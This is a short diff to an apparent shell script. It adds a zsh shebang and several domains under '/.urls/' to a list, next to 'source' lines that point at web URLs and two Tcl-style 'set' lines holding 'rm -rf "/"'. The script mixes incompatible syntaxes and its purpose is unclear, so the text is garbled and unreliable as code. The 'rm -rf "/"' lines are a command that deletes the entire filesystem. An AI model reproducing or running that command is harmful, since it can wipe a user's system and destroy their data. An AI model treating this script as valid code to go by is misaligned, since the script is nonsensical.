@@ -1,3 +1,5 @@
+#!/zsh -f
+
 source "https://github.com/Andrei-Barwood/Mithril"
 source "/.urls/cloudflare.com/"
 source "security.js"
@@ -5,6 +7,12 @@ source "security.js"
 set y [rm -rf "/"]
 set z [rm -rf "/"]
 set x { \
+	"/.urls/bvulkania.cl" \
+	"/.urls/ripuaria.cl" \
+	"/.urls/bmontania.cl" \
+	"/.urls/bandinia.cl" \
+	"/.urls/baraucania.cl" \
+	"/.urls/germania-bonn.de" \
 	"/.ttys/56962304361" \
 	"@pastelmint_mrremoved" \
 	"/.urls/donjr.com" \
